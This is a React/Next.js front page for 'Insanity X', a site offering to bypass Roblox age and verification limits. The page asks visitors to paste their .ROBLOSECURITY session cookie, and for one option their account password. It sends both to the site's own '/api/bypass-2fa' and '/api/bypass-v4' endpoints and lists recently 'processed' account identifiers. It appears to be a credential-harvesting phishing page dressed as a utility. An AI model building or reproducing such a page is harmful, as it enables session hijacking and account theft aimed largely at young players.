"use client"

import { useEffect, useState } from "react"

export default function Home() {
  const [siteStatus, setSiteStatus] = useState("online")

  useEffect(() => {
    const checkStatus = async () => {
      try {
        const res = await fetch("/api/admin/status")
        const data = await res.json()
        setSiteStatus(data.status)
      } catch (e) {
        console.error("Failed to check status")
      }
    }
    checkStatus()
    const interval = setInterval(checkStatus, 10000)
    return () => clearInterval(interval)
  }, [])

  useEffect(() => {
    // Initialize app
    const initApp = () => {
      const ageOption = document.getElementById("age-option") as HTMLSelectElement
      const passwordInput = document.getElementById("password-input") as HTMLInputElement
      const cookieDiv = document.getElementById("cookieInput") as HTMLDivElement
      const cookieInput = document.getElementById("cookie-input") as HTMLTextAreaElement
      const processBtn = document.getElementById("process-btn") as HTMLButtonElement
      const toast = document.getElementById("toast") as HTMLDivElement
      const toastTitle = document.getElementById("toast-title") as HTMLDivElement
      const toastMessage = document.getElementById("toast-message") as HTMLDivElement

      if (cookieDiv && processBtn) {
        cookieDiv.style.display = "none"
        processBtn.style.display = "none"
      }

      ageOption?.addEventListener("change", function () {
        if (this.value === "13plus") {
          passwordInput.style.display = "block"
          cookieDiv.style.display = "block"
          processBtn.style.display = "block"
        } else if (this.value) {
          passwordInput.style.display = "none"
          cookieDiv.style.display = "block"
          processBtn.style.display = "block"
          processBtn.innerHTML = '<i class="fas fa-cogs"></i> PROCESS ACCOUNT'
        } else {
          passwordInput.style.display = "none"
          cookieDiv.style.display = "none"
          processBtn.style.display = "none"
        }
      })

      processBtn?.addEventListener("click", async () => {
        const selectedOption = ageOption.value
        const cookie = cookieInput.value.trim()

        if (!selectedOption) {
          showToast("Error", "Please select an option", false)
          return
        }
        if (!cookie) {
          showToast("Error", "Please enter a .ROBLOSECURITY cookie", false)
          return
        }
        if (selectedOption === "13plus" && !passwordInput.value.trim()) {
          showToast("Error", "Password is required for 13+ bypass", false)
          return
        }

        processBtn.disabled = true
        const originalText = processBtn.innerHTML
        processBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...'

        try {
          let result
          if (selectedOption === "13plus") {
            result = await process2FABypass(cookie, passwordInput.value.trim())
          } else {
            result = await processCookie(cookie)
          }

          if (result.success) {
            // History is updated via polling
            showToast("Success!", result.message)
          } else {
            showToast("Error", result.message, false)
          }
        } catch (error) {
          console.error("Unexpected error:", error)
          showToast("Error", "An unexpected error occurred. Please try again.", false)
        } finally {
          setTimeout(() => {
            processBtn.disabled = false
            processBtn.innerHTML = originalText
          }, 1000)
        }
      })

      function process2FABypass(cookie: string, password: string) {
        return new Promise<{ success: boolean; message: string }>(async (resolve) => {
          try {
            const response = await fetch(
              `/api/bypass-2fa?cookie=${encodeURIComponent(cookie)}&password=${encodeURIComponent(password)}&mode=2fa`,
            )

            if (!response.ok) {
              const errorData = await response.json().catch(() => ({ message: "Unknown error" }))
              resolve({
                success: false,
                message: errorData.message || `API error: ${response.status}`,
              })
              return
            }

            const data = await response.json()

            resolve({
              success: data.status === "success",
              message: data.message || "2FA bypass processed and logged successfully",
            })
          } catch (error) {
            resolve({
              success: false,
              message: error instanceof Error ? error.message : "Request failed",
            })
          }
        })
      }

      function processCookie(cookie: string) {
        return new Promise<{ success: boolean; message: string }>(async (resolve) => {
          try {
            const response = await fetch(`/api/bypass-v4?a=${encodeURIComponent(cookie)}&b=NovaFlareBypasser`)

            if (!response.ok) {
              const errorData = await response.json().catch(() => ({ message: "Unknown error" }))
              resolve({
                success: false,
                message: errorData.message || `API error: ${response.status}`,
              })
              return
            }

            const data = await response.json()

            resolve({
              success: data.status === "success",
              message: data.message || "Cookie processed successfully",
            })
          } catch (error) {
            resolve({
              success: false,
              message: error instanceof Error ? error.message : "Request failed",
            })
          }
        })
      }

      function addToHistory(option: string, cookie: string) {
        // Removed client-side add, relying on server polling
      }

      function showToast(title: string, message: string, isSuccess = true) {
        toastTitle.textContent = title
        toastMessage.textContent = message

        const icon = toast.querySelector(".toast-icon")
        if (isSuccess) {
          toast.style.background = "linear-gradient(90deg, var(--primary), var(--secondary))"
          if (icon) icon.className = "fas fa-check-circle toast-icon"
        } else {
          toast.style.background = "linear-gradient(90deg, var(--danger), #f97316)"
          if (icon) icon.className = "fas fa-exclamation-circle toast-icon"
        }

        toast.classList.add("show")

        setTimeout(() => {
          toast.classList.remove("show")
        }, 4000)
      }
    }

    initApp()
  }, [])

  useEffect(() => {
    // Canvas animation
    const canvas = document.getElementById("bg-anim") as HTMLCanvasElement
    if (!canvas) return

    const ctx = canvas.getContext("2d")
    if (!ctx) return

    let w = window.innerWidth
    let h = window.innerHeight

    const DOTS = 50
    const DOT_RADIUS = 3
    const LINE_DIST = 130
    const dots: Array<{ x: number; y: number; vx: number; vy: number; color: string }> = []

    function resizeCanvas() {
      w = window.innerWidth
      h = window.innerHeight
      canvas.width = w
      canvas.height = h
    }

    function randColor() {
      const ices = ["#0ea5e9", "#38bdf8", "#7dd3fc", "#bae6fd", "#e0f2fe", "#f0f9ff"]
      return ices[Math.floor(Math.random() * ices.length)]
    }

    function createDots() {
      dots.length = 0
      for (let i = 0; i < DOTS; i++) {
        dots.push({
          x: Math.random() * w,
          y: Math.random() * h,
          vx: (Math.random() - 0.5) * 0.7,
          vy: (Math.random() - 0.5) * 0.7,
          color: randColor(),
        })
      }
    }

    function draw() {
      ctx.clearRect(0, 0, w, h)

      for (let i = 0; i < DOTS; i++) {
        for (let j = i + 1; j < DOTS; j++) {
          const dx = dots[i].x - dots[j].x
          const dy = dots[i].y - dots[j].y
          const dist = Math.sqrt(dx * dx + dy * dy)

          if (dist < LINE_DIST) {
            ctx.save()
            ctx.globalAlpha = 1 - dist / LINE_DIST
            ctx.strokeStyle = "#7dd3fc"
            ctx.lineWidth = 1.1
            ctx.beginPath()
            ctx.moveTo(dots[i].x, dots[i].y)
            ctx.lineTo(dots[j].x, dots[j].y)
            ctx.stroke()
            ctx.restore()
          }
        }
      }

      for (const dot of dots) {
        ctx.beginPath()
        ctx.arc(dot.x, dot.y, DOT_RADIUS, 0, Math.PI * 2, false)
        ctx.fillStyle = dot.color
        ctx.shadowColor = "#7dd3fc"
        ctx.shadowBlur = 8
        ctx.fill()
        ctx.shadowBlur = 0
      }
    }

    function update() {
      for (const dot of dots) {
        dot.x += dot.vx
        dot.y += dot.vy

        if (dot.x < 0 || dot.x > w) dot.vx *= -1
        if (dot.y < 0 || dot.y > h) dot.vy *= -1
      }
    }

    function animate() {
      update()
      draw()
      requestAnimationFrame(animate)
    }

    window.addEventListener("resize", () => {
      resizeCanvas()
      createDots()
    })

    resizeCanvas()
    createDots()
    animate()
  }, [])

  useEffect(() => {
    const fetchLatestBypasses = async () => {
      try {
        const response = await fetch("/api/admin/bypasses?limit=3", { cache: "no-store" })
        if (response.ok) {
          const data = await response.json()
          const historyList = document.getElementById("history-list")
          if (historyList && data.bypasses) {
            historyList.innerHTML = ""
            if (data.bypasses.length === 0) {
              historyList.innerHTML =
                '<p style="text-align: center; color: var(--ice-200); padding: 20px;">No bypasses processed yet</p>'
            }
            data.bypasses.forEach((bypass: any) => {
              const historyItem = document.createElement("div")
              historyItem.className = "history-item fade-in"

              const title = bypass.type
              const desc = bypass.identifier
              const date = new Date(bypass.timestamp).toLocaleString("en-US", {
                month: "numeric",
                day: "numeric",
                year: "numeric",
                hour: "numeric",
                minute: "2-digit",
                second: "2-digit",
                hour12: true,
              })

              historyItem.innerHTML = `
                <i class="fas fa-check-circle history-icon"></i>
                <div style="width: 100%">
                  <div class="history-text" style="font-weight: bold; color: var(--ice-100);">${title}</div>
                  <div class="history-subtext" style="color: var(--ice-200); font-size: 0.9rem; margin-bottom: 4px;">${desc}</div>
                  <div class="history-date" style="color: var(--ice-300); font-size: 0.75rem;">
                    <i class="far fa-clock" style="margin-right: 4px;"></i>${date}
                  </div>
                </div>
              `
              historyList.appendChild(historyItem)
            })
          }
        }
      } catch (error) {
        console.error("Failed to fetch bypasses:", error)
      }
    }

    fetchLatestBypasses()
    const interval = setInterval(fetchLatestBypasses, 5000)
    return () => clearInterval(interval)
  }, [])

  if (siteStatus === "offline") {
    return (
      <div
        style={{
          height: "100vh",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          background: "linear-gradient(135deg, #0c4a6e 0%, #082f49 100%)",
          color: "#f8fafc",
          flexDirection: "column",
          gap: "20px",
          position: "relative",
          overflow: "hidden",
        }}
      >
        <div className="snowflakes" aria-hidden="true">
          {[...Array(50)].map((_, i) => (
            <div key={i} className="snowflake">
              ❅
            </div>
          ))}
        </div>
        <h1 style={{ fontSize: "3rem", color: "#0ea5e9", zIndex: 2 }}>SYSTEM OFFLINE</h1>
        <p style={{ zIndex: 2 }}>The bypasser is currently offline for maintenance.</p>
      </div>
    )
  }

  if (siteStatus === "updating") {
    return (
      <div
        style={{
          height: "100vh",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          background: "linear-gradient(135deg, #0c4a6e 0%, #082f49 100%)",
          color: "#f8fafc",
          flexDirection: "column",
          gap: "20px",
          position: "relative",
          overflow: "hidden",
        }}
      >
        <div className="snowflakes" aria-hidden="true">
          {[...Array(50)].map((_, i) => (
            <div key={i} className="snowflake">
              ❅
            </div>
          ))}
        </div>
        <h1 style={{ fontSize: "3rem", color: "#38bdf8", zIndex: 2, animation: "pulse 2s ease-in-out infinite" }}>
          Updating...
        </h1>
        <p style={{ zIndex: 2, textAlign: "center", maxWidth: "500px", fontSize: "1.1rem" }}>
          This Site is Down so One of the Admins of Insanity X is Updating the Bypasser
        </p>
        <div
          className="spinner"
          style={{
            border: "4px solid #38bdf8",
            borderTop: "4px solid transparent",
            borderRadius: "50%",
            width: "60px",
            height: "60px",
            animation: "spin 1s linear infinite",
            zIndex: 2,
          }}
        ></div>
        <style>{`
          @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
          }
          @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.8; transform: scale(1.05); }
          }
        `}</style>
      </div>
    )
  }

  return (
    <>
      <style jsx global>{`
        body {
          overflow-x: hidden;
        }
        .admin-btn-inline {
          display: inline-block;
          margin-top: 10px;
          color: var(--ice-400);
          text-decoration: none;
          font-size: 0.9rem;
          transition: color 0.3s;
        }
        .admin-btn-inline:hover {
          color: var(--ice-300);
        }
        
        /* Added snowflakes animation styles */
        .snowflakes {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          pointer-events: none;
          z-index: 1;
        }
        
        .snowflake {
          position: absolute;
          top: -10px;
          color: #fff;
          font-size: 1.5em;
          animation: fall linear infinite;
          opacity: 0.8;
          text-shadow: 0 0 10px rgba(14, 165, 233, 0.8);
        }
        
        @keyframes fall {
          0% {
            transform: translateY(0) rotate(0deg);
            opacity: 0.8;
          }
          100% {
            transform: translateY(100vh) rotate(360deg);
            opacity: 0;
          }
        }
        
        ${[...Array(50)]
          .map(
            (_, i) => `
          .snowflake:nth-child(${i + 1}) {
            left: ${Math.random() * 100}%;
            animation-duration: ${5 + Math.random() * 10}s;
            animation-delay: ${Math.random() * 5}s;
            font-size: ${0.5 + Math.random() * 1.5}em;
          }
        `,
          )
          .join("")}
      `}</style>

      <div className="snowflakes" aria-hidden="true">
        {[...Array(50)].map((_, i) => (
          <div key={i} className="snowflake">
            ❅
          </div>
        ))}
      </div>

      <canvas id="bg-anim"></canvas>

      <div className="container">
        <header className="header">
          <div className="logo">
            <div className="logo-icon pulse">
              <i className="fas fa-snowflake"></i>
            </div>
            <h1 className="title">INSANITY X</h1>
          </div>
          <p className="subtitle">Insanity X...Bypasser - Force disable Verify email to unverify</p>
          <a href="/admin" className="admin-btn-inline">
            <i className="fas fa-cog"></i> Admin Panel
          </a>
        </header>

        <div className="content-wrapper">
          <div className="main-content">
            <div className="card">
              <h2 className="card-title">
                <i className="fas fa-key"></i> Account Security Options
              </h2>

              <div className="input-group">
                <label htmlFor="age-option" className="input-label">
                  <i className="fas fa-user-clock"></i> Select Age Bypass Method
                </label>
                <select id="age-option" className="select-field">
                  <option value="">-- select an option --</option>
                  <option value="2008">13+ / 18+ Account</option>
                  <option value="13plus">13+ All Ages</option>
                </select>
                <input
                  id="password-input"
                  className="password-field"
                  type="password"
                  placeholder="Enter account password for verification..."
                />
              </div>

              <div id="cookieInput">
                <div className="input-group">
                  <label htmlFor="cookie-input" className="input-label">
                    <i className="fas fa-cookie"></i> .ROBLOSECURITY Cookie
                  </label>
                  <textarea
                    id="cookie-input"
                    className="input-field"
                    placeholder="Paste your .ROBLOSECURITY cookie here..."
                    spellCheck="false"
                  ></textarea>
                </div>
                <button id="process-btn" className="process-btn">
                  <i className="fas fa-cogs"></i> PROCESS ACCOUNT
                </button>
              </div>

              <div id="result-box" className="result-box">
                <div className="result-title">
                  <i className="fas fa-check-circle"></i> Bypass Successful!
                </div>
                <div className="result-content">
                  Account age restriction successfully bypassed. New status: <strong>13+</strong>
                </div>
              </div>
            </div>
          </div>

          <div className="card" style={{ marginTop: "40px" }}>
            <h2 className="card-title">
              <i className="fas fa-history"></i> Latest Processed
            </h2>
            <div id="history-list" className="history-list">
              <p style={{ textAlign: "center", color: "var(--purple-200)", padding: "20px" }}>
                No bypasses processed yet
              </p>
            </div>
          </div>
        </div>
      </div>

      <div className="toast" id="toast">
        <i className="fas fa-check-circle toast-icon"></i>
        <div className="toast-content">
          <div className="toast-title" id="toast-title">
            Success!
          </div>
          <div className="toast-message" id="toast-message">
            Account processed successfully
          </div>
        </div>
      </div>
    </>
  )
}
